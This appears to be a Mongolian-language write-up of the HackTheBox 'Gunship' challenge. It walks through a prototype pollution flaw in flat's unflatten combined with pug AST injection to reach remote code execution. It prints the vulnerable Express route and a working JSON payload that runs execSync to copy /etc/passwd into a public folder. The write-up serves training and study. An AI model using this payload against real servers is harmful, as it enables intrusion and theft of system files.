# Gunship - Ast injection + Prototype Pollution

Вебсайт руу хандах үед дараах хуудас гарч ирнэ.

[image]

Жоохон доошоо гүйлгэх үед дараах хэсэгт нэр оруулах боломжтой Input байна. Gunship хамтлагын дуртай дуучины нэрийг оруулвал **Hello guest, thank you for letting us know!** гэсэн хариу өгч байна.

[image]

**Result:**

[image]

Hackthebox-оос өгөгдсөн тухайн challenge-ийн Source файлыг татаж авсан бөгөөд үүгээр дамжуулан кодны алдааг хайх, мөн ямар зүйл шаардаж байгааг харах боломжтой байна.

[image]

## Lets Exploit!

**npm install** тушаалыг ашиглан тухайн JS файлд ашигласан нийт

[image]

**npm audit fix** тушаалаар ямар эмзэг байдалд өртөмтгий байгааг харах боломжтой байна.

**flat <5.0.1 |** flat vulnerable to Prototype Pollution

[image]

Reference: https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68

## Prototype Pollution

**Нийт эх код**

```javascript
router.post('/api/submit', (req, res) => {
const { artist } = unflatten(req.body);
    if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
            return res.json({
                    'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
            });
    } else {
            return res.json({
                    'response': 'Please provide us with the full name of an existing member.'
            });
    }
});

module.exports = router;
```

**Энэ кодын мөрийг анхаарна уу:**

```javascript
const { song } = unflatten(req.body);
```

`unflatten` санд ашиглаж болох Prototype Pollution төрлийн эмзэг байдал байна:

## AST Injection

**Энэ кодын мөрийг анхаарна уу:**

```javascript
pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
```

**Prototype pollution болон AST injection-ийг хослуулан ашиглаж RCE хийх боломжтой байна.**

```json
{
    "artist.name": "Haigh",
    "__proto__": {
        "block": {
            "type": "Text",
            "line": "console.log(process.mainModule.require('child_process').execSync('cat /etc/passwd > static/images/out.txt').toString())"
        }
    }
}
```

Тухайн вебээр дамжиж байсан `{"artist.name":"Haigh"}` гэх json хүсэлтийг дараах байдлаар өөрчилж, static/images/out.txt рүү /etc/passwd -ийг copy хийсэн. Энэ нэг талаараа сервер дээр шууд хийж буй үйлдэл юм.

[image]

## Exploited!

[image]
